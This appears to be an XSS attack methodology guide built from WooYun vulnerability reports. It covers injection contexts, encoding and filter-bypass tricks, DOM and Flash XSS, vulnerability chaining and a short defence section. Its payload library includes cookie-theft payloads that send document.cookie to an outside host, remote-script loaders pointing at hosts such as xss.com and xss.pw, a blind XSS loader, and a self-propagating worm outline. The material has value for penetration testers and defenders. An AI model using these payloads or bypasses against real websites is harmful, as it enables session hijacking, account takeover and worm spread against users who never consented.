# XSS Vulnerability Analysis Methodology

> Distilled from 7,532 cases | Data source: WooYun Vulnerability Database (2010-2016)

---

## 1. Metacognitive Framework: Understanding the Nature of XSS

### 1.1 Core Principles

The essence of XSS is **breaking trust boundaries**:
- **Input trust**: The application trusts that user input is "data" rather than "code"
- **Output trust**: The browser trusts that content returned by the server is "safe"
- **Context confusion**: Semantic changes of data across different contexts (HTML/JS/CSS/URL)

### 1.2 Three-Layer Analysis Model

```
+-----------------------------------------------------+
| Layer 1: Input Point Identification                  |
|          (Where does data enter?)                    |
+---------------------------------+-------------------+
| Layer 2: Data Flow Tracing                           |
|          (How does data flow?)                       |
+---------------------------------+-------------------+
| Layer 3: Output Context                              |
|          (Where does data render?)                   |
+-----------------------------------------------------+
```

---

## 2. Output Point Identification and Classification

### 2.1 High-Risk Output Point Classification Matrix

| Output Point Type | Trigger Condition | Typical Scenario | Case Source |
|-------------------|-------------------|------------------|-------------|
| User nickname/signature | Page load | Profile pages, comment sections, friend lists | Social networking site, gaming platform, IM client |
| Search box reflection | Search operation | Search results page, search history | Social platform, search engine forums |
| Comments/messages | Content display | Forums, blogs, product reviews | Automotive forum, e-commerce platform, internet company |
| Filename/description | File listing | Cloud storage, photo albums, attachment management | Search engine cloud storage service |
| Email body/subject | Opening email | Email systems | Coremail, webmail service, eYou |
| URL parameter reflection | Page rendering | Share links, redirect pages | Internet company mobile builder, social platform |
| Image alt/src | Image loading | Rich text editors | E-commerce forum |
| Flash parameters | SWF loading | Video players, music players | Social platform, music video site |
| Order notes/remarks | Backend viewing | E-commerce backend, ticket systems | Shopping CMS, e-commerce platform |
| API callback parameters | JS execution | JSONP, callback functions | Music video site Flash |

### 2.2 Hidden Output Points (Commonly Overlooked)

**Case Insight**: The following output points are frequently missed during security testing

1. **HTTP Header Reflection**
   - X-Forwarded-For -> Logging systems
   - Client-IP -> Backend IP display
   - User-Agent -> Traffic analytics

2. **Mobile/WAP Synchronization**
   - WAP page submission -> PC display (classifieds website case)
   - APP write -> Web display (fintech platform case)

3. **Client-Web Synchronization**
   - Client nickname -> Web page (IM client case)
   - Desktop application settings -> Web admin panel

4. **Secondary Rendering Points**
   - Draft box title listing (search engine knowledge base case)
   - Review/audit listing (CMS case)
   - Admin backend statistics page

---

## 3. Context Analysis Methods

### 3.1 Context Type Identification

#### 3.1.1 HTML Tag Content Context

```html
<!-- Output point within tag content -->
<div>User input: {{OUTPUT}}</div>
```

**Test Vectors**:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### 3.1.2 HTML Attribute Context

```html
<!-- Output point within attribute value -->
<input value="{{OUTPUT}}">
<a href="{{OUTPUT}}">
<img src="{{OUTPUT}}">
```

**Test Vectors**:
```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### 3.1.3 JavaScript Context

```javascript
// Output point within JS string
var name = '{{OUTPUT}}';
var data = {"key": "{{OUTPUT}}"};
callback('{{OUTPUT}}');
```

**Test Vectors**:
```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

**Real-World Case (social platform)**:
```javascript
// Original code
backurl=http://...?url=aaaaaaaa',a:(alert(1))//
// Closing JSON object to achieve code execution
```

#### 3.1.4 URL Context

```html
<a href="{{OUTPUT}}">
<iframe src="{{OUTPUT}}">
```

**Test Vectors**:
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

#### 3.1.5 CSS Context

```html
<div style="{{OUTPUT}}">
<style>{{OUTPUT}}</style>
```

**Test Vectors (IE-specific)**:
```css
xss:expression(alert(1))
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

### 3.2 Quick Context Determination Flow

```
+-- Examine output location in source code
|
+-- Inside <script> tag? -> JavaScript context
|   |-- Check quote type (single/double), whether in string/object/function
|
+-- Inside HTML attribute? -> Attribute context
|   |-- Check attribute type (event/src/href/regular)
|
+-- Inside tag content? -> HTML context
|   |-- Check for special tags (textarea/title/script/style)
|
+-- Inside URL? -> URL context
|   |-- Check protocol restrictions, encoding handling
|
+-- Inside CSS? -> CSS context
    |-- Check whether expression is supported
```

---

## 4. Bypass Techniques

### 4.1 Encoding Bypass

#### 4.1.1 HTML Entity Encoding

**Scenario**: `<>` are filtered but HTML entities are not

```html
<!-- Original filtering -->
<script> -> filtered

<!-- Bypass method -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

**Real-World Case (automotive forum)**:
```html
<!-- Direct insertion blocked -->
<script>alert(document.cookie)</script>

<!-- HTML decimal entity bypass successful -->
&#60;script&#62;alert(document.cookie)&#60;/script&#62;
```

#### 4.1.2 Unicode Encoding

**Scenario**: WAF or filter does not handle Unicode

```javascript
// Original
<iframe/onload=alert(1)>

// Unicode encoding bypass
\u003ciframe\u002fonload\u003dalert(1)\u003e

// Real-world case (PC manufacturer forum Flash XSS)
https://example.com/[redacted]
```

#### 4.1.3 Base64 Encoding

**Scenario**: data protocol combined with base64

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

#### 4.1.4 CSS Encoding (IE)

```css
/* Hexadecimal encoding */
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

### 4.2 Tag Mutation Bypass

#### 4.2.1 Case Confusion

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

#### 4.2.2 Tag Separator Mutation

```html
<script/src=//xss.com/x.js>       <!-- Slash replacing space -->
<script	src=//xss.com/x.js>       <!-- Tab replacing space -->
<script
src=//xss.com/x.js>               <!-- Newline replacing space -->
```

#### 4.2.3 Attribute Separator Mutation

```html
<img src=x onerror=alert(1)>      <!-- No quotes -->
<img src=x onerror='alert(1)'>    <!-- Single quotes -->
<img src=x onerror="alert(1)">    <!-- Double quotes -->
```

### 4.3 Event Trigger Bypass

#### 4.3.1 Alternative Event Handlers

```html
<!-- Alternatives when common events are filtered -->
<img src=x onerror=alert(1)>                    <!-- Image load error -->
<svg onload=alert(1)>                           <!-- SVG load -->
<body onload=alert(1)>                          <!-- Page load -->
<input onfocus=alert(1) autofocus>              <!-- Auto focus -->
<select autofocus onfocus=alert(1)>             <!-- Select focus -->
<textarea autofocus onfocus=alert(1)>           <!-- Textarea focus -->
<marquee onstart=alert(1)>                      <!-- Marquee start -->
<video><source onerror=alert(1)>                <!-- Video source error -->
<audio src=x onerror=alert(1)>                  <!-- Audio error -->
<details open ontoggle=alert(1)>                <!-- Details toggle -->
<frameset onload=alert(1)>                      <!-- Frameset load -->
```

**Real-World Case (eYou email system)**:
```html
<!-- autofocus + onfocus combination -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(2)>
<textarea autofocus onfocus=alert(3)>
```

#### 4.3.2 User Interaction Events

```html
<div onmouseover=alert(1)>hover me</div>
<div onmouseout=alert(1)>leave me</div>
<div onclick=alert(1)>click me</div>
<div oncontextmenu=alert(1)>right click</div>
```

### 4.4 WAF/Filter Bypass

#### 4.4.1 Character Insertion Bypass

**Real-World Case (WAF bypass)**:
```html
<!-- Adding dots before/after <> to bypass -->
.<script src=http://localhost/1.js>.
```

#### 4.4.2 Comment Interference

```html
<!--[if true]><img onerror=alert(1) src=-->
```

#### 4.4.3 Null Byte Bypass

```html
<scr\x00ipt>alert(1)</script>
<img src=x o\x00nerror=alert(1)>
```

#### 4.4.4 Double-Write Bypass

```html
<!-- Filter removes "script" once -->
<scrscriptipt>alert(1)</scrscriptipt>
```

### 4.5 Length Restriction Bypass

#### 4.5.1 External JS Loading

```html
<!-- Shortest external load -->
<script src=//xss.pw/j>

<!-- Combined with short domains -->
<script src=//short.example/xxx>
```

#### 4.5.2 Segmented Injection

**Real-World Case (social networking site)**:
```javascript
// Using String.fromCharCode to bypass length limits and keyword filtering
// Encode payload as character code sequence then execute
```

#### 4.5.3 DOM Concatenation

```javascript
// Creating script tag via DOM
var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s);
```

### 4.6 HTTPOnly Bypass

#### 4.6.1 Flash Method

**Real-World Case (cloud storage service)**:
```
Using Flash interfaces to obtain user information, bypassing httponly restrictions
Calling JS interfaces through Flash to implement cookie alternatives
```

#### 4.6.2 CSRF Alternative

When cookies cannot be obtained, use CSRF approach instead:
- Execute sensitive operations (change password, add admin)
- Read page tokens
- Send phishing forms

---

## 5. DOM-based XSS Analysis

### 5.1 Dangerous DOM Sources

```javascript
// User-controllable DOM sources
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
document.referrer
location
location.href
location.search
location.hash
location.pathname
window.name
document.cookie
```

### 5.2 Dangerous DOM Sinks

```javascript
// Direct execution functions
setTimeout()
setInterval()
Function()

// HTML injection (dangerous methods, should be avoided)
innerHTML
outerHTML
insertAdjacentHTML()

// Attribute setting
element.src
element.href
element.action
```

### 5.3 DOM XSS Case Analysis

**Case 1: Improper document.domain Setting (internet company)**

```javascript
// Vulnerable code
var g_sDomain = QSFL.excore.getURLParam("domain");
document.domain = g_sDomain;

// Exploitation (Webkit browsers)
https://example.com/[redacted]
// Can set document.domain to "com", breaking same-origin policy
```

**Case 2: Flash htmlText Injection (social platform)**

```actionscript
// Flash htmlText supports <img> tags for loading SWFs
this.txt_songName.htmlText = param1.songName;

// Exploitation
// Set song name to: <img src="https://example.com/[redacted]">
// Flash loads and executes malicious SWF
```

### 5.4 DOM XSS Testing Flow

```
1. Identify JavaScript code on the page
2. Locate DOM source usage points
3. Trace data flow to DOM sinks
4. Check for filtering/encoding
5. Construct PoC for verification
```

---

## 6. Flash XSS Analysis

### 6.1 Dangerous Flash Parameters

```actionscript
// ExternalInterface.call injection
ExternalInterface.call("function", userInput);

// Dangerous allowScriptAccess setting
allowscriptaccess="always"  // Allows cross-domain JS calls

// navigateToURL
navigateToURL(new URLRequest("javascript:alert(1)"));
```

### 6.2 crossdomain.xml Exploitation

**Real-World Case (webmail service)**:
```xml
<cross-domain-policy>
    <allow-access-from domain="*.example.com"/>
</cross-domain-policy>
```

Exploitation approach:
1. Find an upload point on *.example.com (image disguised as SWF)
2. Upload malicious SWF
3. Read webmail service data through Flash

### 6.3 Flash XSS Rootkit

**Real-World Case (music video site)**:
```
1. Flash player stores LocalSharedObject (LSO)
2. LSO data is read and executed on the page
3. Attacker poisons LSO, achieving persistent XSS
```

---

## 7. Payload Library

### 7.1 Basic Detection Payloads

```html
<!-- Simple alert -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Image error trigger -->
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>

<!-- SVG trigger -->
<svg onload=alert(1)>
<svg/onload=alert(1)>

<!-- Mouse events -->
"onmouseover="alert(1)"
' onmouseover='alert(1)'
```

### 7.2 Cookie Theft Payloads

```html
<!-- Basic theft -->
<script>new Image().src="https://example.com/[redacted]"+document.cookie</script>

<!-- Using fetch -->
<script>fetch('https://example.com/[redacted]'+document.cookie)</script>

<!-- Via img -->
<img src=x onerror="new Image().src='https://example.com/[redacted]'+document.cookie">
```

### 7.3 External JS Loading Payloads

```html
<!-- Standard method -->
<script src=//xss.com/x.js></script>

<!-- Dynamic creation -->
<script>var s=document.createElement('script');s.src='//xss.com/x.js';document.body.appendChild(s)</script>

<!-- Ultra-short payload -->
<script src=//xss.pw/j>
```

### 7.4 Bypass Payloads

```html
<!-- Unicode encoding -->
<iframe/onload=alert(1)>  ->  Convert to Unicode

<!-- HTML entities -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- Base64 -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">

<!-- String concatenation to bypass keywords -->
<script>window['al'+'ert'](1)</script>

<!-- fromCharCode bypass -->
<script>String.fromCharCode(97,108,101,114,116,40,49,41)</script>
```

### 7.5 Worm Payload Examples

**Social networking site worm code structure**:
```javascript
function worm(){
    jQuery.post("https://example.com/[redacted]", {
        "content": "<payload_with_self_propagation>",
        // ... other params
    })
}
worm()
```

**Core elements**:
1. Obtain current user identity (cookie/token)
2. Construct auto-publishing content
3. Content contains the same malicious code
4. Trigger condition: view/visit

---

## 8. Testing Workflow and Methodology

### 8.1 Black-Box Testing Flow

```
+------------------------------------------------+
| 1. Information Gathering                        |
|    - Identify all input points                  |
|    - Record parameter names and locations       |
|    - Determine data types and purposes          |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 2. Initial Probing                              |
|    - Input special characters: <>"';&           |
|    - Observe encoding in responses              |
|    - Determine output context                   |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 3. Payload Construction                         |
|    - Select payload based on context            |
|    - Attempt to close existing tags/attributes  |
|    - Test event handlers                        |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 4. Bypass Testing                               |
|    - Encoding bypass                            |
|    - Tag mutation                               |
|    - Alternative events                         |
+----------------------+-------------------------+
                       |
                       v
+------------------------------------------------+
| 5. Exploitation Verification                    |
|    - Confirm code execution                     |
|    - Test cookie retrieval                      |
|    - Verify actual impact                       |
+------------------------------------------------+
```

### 8.2 Detection Checklist

**Input Point Checks**:
- [ ] URL parameters (GET)
- [ ] Form fields (POST)
- [ ] HTTP headers (User-Agent, Referer, X-Forwarded-For)
- [ ] Cookie values
- [ ] Filenames/file content
- [ ] JSON/XML data

**Output Point Checks**:
- [ ] Direct HTML output
- [ ] JavaScript variable assignment
- [ ] Within HTML attributes
- [ ] Within URLs
- [ ] Within CSS
- [ ] Within error messages

**Context Checks**:
- [ ] Inside a tag
- [ ] Inside an attribute
- [ ] Inside a JS string
- [ ] Quote type (single/double/none)
- [ ] HTML encoding present
- [ ] JS encoding present

### 8.3 Blind XSS Strategy

**Applicable Scenarios**:
- Admin backend systems
- Content review systems
- Ticket/helpdesk systems
- Feedback/contact forms

**Blind XSS Payload Example**:
```html
<script src=https://example.com/[redacted]
```

**Successful Cases**:
- Government vehicle management office: Blind injection via feedback form gained backend access
- Medical Q&A platform: Blind injection via bio field obtained backend cookies
- Gaming platform: Blind injection via user nickname gained admin access

---

## 9. Vulnerability Chaining

### 9.1 XSS + CSRF

**Case (CMS platform)**:
1. Obtain page Token via XSS
2. Construct CSRF request using the Token
3. Execute admin operations (delete, modify)

### 9.2 XSS + SQL Injection

**Case (email system)**:
1. Blind XSS to obtain admin cookies
2. Access backend functionality using cookies
3. SQL injection in backend for further exploitation

### 9.3 XSS + File Upload

**Case (recruitment CMS)**:
1. Discover KindEditor demo files
2. Upload HTML file containing XSS
3. Lure admin to visit and trigger

### 9.4 XSS -> Account Hijacking -> Privilege Escalation

**Case (social platform worm)**:
```
XSS trigger -> Obtain skey -> Forge cookie ->
Auto-post to social feed -> Auto-follow -> Worm propagation
```

---

## 10. Defensive Insights

### 10.1 Common Defense Mistakes

1. **Only filtering script tags**: Ignoring other tags and events
2. **Only filtering lowercase**: Case confusion bypass
3. **Blocklist filtering**: Always missing some tags/events
4. **Client-side filtering**: Bypass by intercepting requests
5. **Single-pass filtering**: Double-write bypass
6. **Only filtering input**: Ignoring secondary encoding issues

### 10.2 Effective Defense Measures

1. **Output encoding**: Choose correct encoding based on context
   - HTML context: HTML entity encoding
   - JS context: JavaScript encoding
   - URL context: URL encoding

2. **CSP policy**: Restrict script sources
3. **HTTPOnly**: Protect cookies
4. **Input validation**: Allowlist-based validation

---

## Appendix: Case Index

| Vulnerability Type | Typical Cases | Key Technical Points |
|-------------------|---------------|---------------------|
| Stored XSS | Classifieds site, automotive forum, social networking site | User input storage, multi-point triggering |
| Reflected XSS | Social platform, state-owned bank, major portal | URL parameter reflection |
| DOM XSS | Internet company document.domain, social platform Flash | Client-side code execution |
| Flash XSS | Music video site rootkit, webmail crossdomain | SWF security configuration |
| mXSS | Social platform email, webmail service | Browser parsing differences |
| Blind XSS | Government office, e-commerce platform, medical Q&A | Backend triggering |
| Worm XSS | Social networking site, social platform | Auto-propagation |

---

*This document is distilled from real WooYun vulnerability cases, intended solely for security research and defensive reference*
